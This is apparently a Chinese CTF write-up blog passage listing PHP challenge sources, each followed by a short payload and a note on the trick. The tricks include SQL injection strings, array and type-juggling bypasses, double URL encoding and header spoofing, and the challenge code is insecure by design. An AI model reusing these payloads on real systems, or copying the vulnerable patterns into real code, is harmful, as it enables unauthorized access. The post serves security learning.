<p>再来一个题:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: ZTS</span><br><span class="line"> * Date: 2017/12/15</span><br><span class="line"> * Time: 9:59</span><br><span class="line"> */</span><br><span class="line">error_reporting(0);</span><br><span class="line">$password = $_GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">var_dump($password);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">var_dump(strcmp(&apos;cab56ab0de5376d2a0c73307ea011da4&apos;, $password));</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (strcmp(&apos;cab56ab0de5376d2a0c73307ea011da4&apos;, $password)) &#123;</span><br><span class="line">	//二进制安全字符串比较</span><br><span class="line">	echo &apos;password is false ! ! ! ! !&apos;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo &apos;flag is here!!&lt;br&gt;&apos;;</span><br><span class="line">	echo &apos;flag&#123;vUlnCtF_This_iS_a_FlAg&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password[]=123</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>php&lt;=5.3时,strcmp接收数组时返回null，然而我用5.45的php怎么还是返回0 - -。有毒吧，我的php版本和机器位数都是摆设啊！</p>
<h1 id="数组绕过sha1"><a href="#数组绕过sha1" class="headerlink" title="数组绕过sha1"></a>数组绕过sha1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) </span><br><span class="line">&#123;</span><br><span class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">        echo &apos;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&apos;;</span><br><span class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">      die(&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &apos;&lt;p&gt;Invalid password.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>第二主要是利用===，因为sha1处理数组返回false。<br>这里不能用0e开头md5值的解密字符串绕过，这是sha1，不是md5.</p>
<h1 id="bp绕过session"><a href="#bp绕过session" class="headerlink" title="bp绕过session"></a>bp绕过session</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">	if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;]) &#123;</span><br><span class="line">		die(&apos;Flag: &apos; . $flag);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?password=</span><br><span class="line">bp把seesion=...后面的删了</span><br></pre></td></tr></table></figure></p>
<p>poc:<br>这是个脑洞题吧..不能password=1，seesion=1这样，因为这个seesion不是$_SESSION[‘password’]，而是$_SESSION[‘password’]经过变换后得到的值，然而设成空后，$_SESSION[‘password’]肯定为空</p>
<h1 id="这个属于sql注入了吧…"><a href="#这个属于sql注入了吧…" class="headerlink" title="这个属于sql注入了吧…"></a>这个属于sql注入了吧…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//配置数据库</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//赋值</span><br><span class="line"></span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"></span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line"></span><br><span class="line">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:&apos; union select md5(1)#</span><br><span class="line">pass:1</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>sql注入，没什么说的.</p>
<h1 id="url双重编码"><a href="#url双重编码" class="headerlink" title="url双重编码"></a>url双重编码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (eregi(&quot;hackerDJ&quot;, $_GET[id])) &#123;</span><br><span class="line">	echo (&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"></span><br><span class="line">if ($_GET[id] == &quot;hackerDJ&quot;) &#123;</span><br><span class="line">	echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=hack%25%36%35rDJ</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>首先url栏提交到后台本来就url解密一次，随便找个字符加密2次就行，因为代码后面还给了个urldecode()</p>
<h1 id="sql闭合"><a href="#sql闭合" class="headerlink" title="sql闭合"></a>sql闭合</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);</span><br><span class="line">    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select user from php where (user=&apos;$user&apos;) and (pw=&apos;$pass&apos;)&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"></span><br><span class="line">  if($row[&apos;user&apos;]==&quot;admin&quot;) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if($row[&apos;user&apos;] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:admin&apos;)#</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>差点忘了)。。。</p>
<h1 id="改xff"><a href="#改xff" class="headerlink" title="改xff"></a>改xff</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function GetIP()&#123;</span><br><span class="line">if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">else</span><br><span class="line">    $cip = &quot;0.0.0.0&quot;;</span><br><span class="line">return $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line">if ($GetIPs==&quot;1.1.1.1&quot;)&#123;</span><br><span class="line">echo &quot;Great! Key is *********&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;错误！你的IP不在访问列表之内！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python发个包或bp改下xff或火狐用modify headers改个xff</span><br></pre></td></tr></table></figure></p>
<h1 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$md51 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br>查0e开头的md5解密值</p>
<h1 id="intval四舍五入"><a href="#intval四舍五入" class="headerlink" title="intval四舍五入"></a>intval四舍五入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if ($_GET[id]) &#123;</span><br><span class="line">	$id = intval($_GET[id]);</span><br><span class="line">	if ($id == 1024) &#123;</span><br><span class="line">		$flag = &apos;neko!!&apos;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ($_GET[id] == 1024) &#123;</span><br><span class="line">		echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo ($flag);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1024.1</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>intval()四舍五入</p>
<h1 id="数组绕过strpos"><a href="#数组绕过strpos" class="headerlink" title="数组绕过strpos"></a>数组绕过strpos</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;nctf&apos;])) &#123;</span><br><span class="line">	if (@ereg(&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) &#123;</span><br><span class="line">		echo &apos;error1&apos;;</span><br><span class="line">	&#125; else if (strpos($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) &#123;</span><br><span class="line">		die(&apos;Flag: &apos; . $flag);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &apos;error2&apos;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?nctf[]=#biubiubiu</span><br><span class="line">?nctf=1%00%23biubiubiu</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>ereg()和strpos()接收数组都返回false<br>第二种要将#编码，不知道为什么</p>
<h1 id="也是个sql注入"><a href="#也是个sql注入" class="headerlink" title="也是个sql注入"></a>也是个sql注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    if(get_magic_quotes_gpc())&#123; //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span><br><span class="line">        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\&apos; 转换为 &apos; 等等）。双反斜线（\\）被转换为单个反斜线（\）。 </span><br><span class="line">    &#125;</span><br><span class="line">    return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">//$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;admin\&apos;\&apos; AND pass=\&apos;&apos;or 1 #&apos;\&apos;;&apos;;</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">    die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">懒得配环境了，写个大致思路:</span><br><span class="line">?username=\\&amp;password=&apos; or 1=1 or &apos;</span><br></pre></td></tr></table></figure></p>
<h1 id="16进制绕过10进制检测"><a href="#16进制绕过10进制检测" class="headerlink" title="16进制绕过10进制检测"></a>16进制绕过10进制检测</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">    $flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">    $one = ord(&apos;1&apos;);  //ord — 返回字符的 ASCII 码值</span><br><span class="line">    $nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">    $number = &apos;3735929054&apos;;</span><br><span class="line">    // Check all the input characters!</span><br><span class="line">    for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123; </span><br><span class="line">        // Disallow all the digits!</span><br><span class="line">        $digit = ord($temp&#123;$i&#125;);</span><br><span class="line">        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">        &#123;</span><br><span class="line">            // Aha, digit not allowed!</span><br><span class="line">            return &quot;flase&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($number == $temp)</span><br><span class="line">        return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=0xdeadc0de</span><br></pre></td></tr></table></figure></p>
<h1 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if  (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;]) </span><br><span class="line">&#123; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">    if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">    &#123; </span><br><span class="line">        echo &apos;Wrong Format&apos;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">    while (TRUE) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; </span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            break; </span><br><span class="line">        $c = 0; </span><br><span class="line">        $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span><br><span class="line">        foreach ($ps as $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) </span><br><span class="line">                $c += 1; </span><br><span class="line">        &#125; </span><br><span class="line">        if ($c &lt; 3) break; </span><br><span class="line">        //&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">        if (&quot;42&quot; == $password) echo $flag; </span><br><span class="line">        else echo &apos;Wrong password&apos;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password:42.00e+0000000000</span><br><span class="line">password:420.000000000e-1</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>至少12个字符，且必须要有大小写字母，数字，字符内容三种与三种以上</p>
<h1 id="弱类型-amp-00截断绕过is-numeric"><a href="#弱类型-amp-00截断绕过is-numeric" class="headerlink" title="弱类型&amp;00截断绕过is_numeric"></a>弱类型&amp;00截断绕过is_numeric</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;flag&#123;test&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;    </span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?password=9999a</span><br><span class="line">?password=9999%00  //也可以00截断</span><br></pre></td></tr></table></figure></p>
<h1 id="md5-true"><a href="#md5-true" class="headerlink" title="md5(,true)"></a>md5(,true)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$link = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;);</span><br><span class="line">if (!$link) &#123; </span><br><span class="line">  die(&apos;Could not connect to MySQL: &apos; . mysql_error()); </span><br><span class="line">&#125; </span><br><span class="line">// 选择数据库</span><br><span class="line">$db = mysql_select_db(&quot;security&quot;, $link);</span><br><span class="line">if(!$db)</span><br><span class="line">&#123;</span><br><span 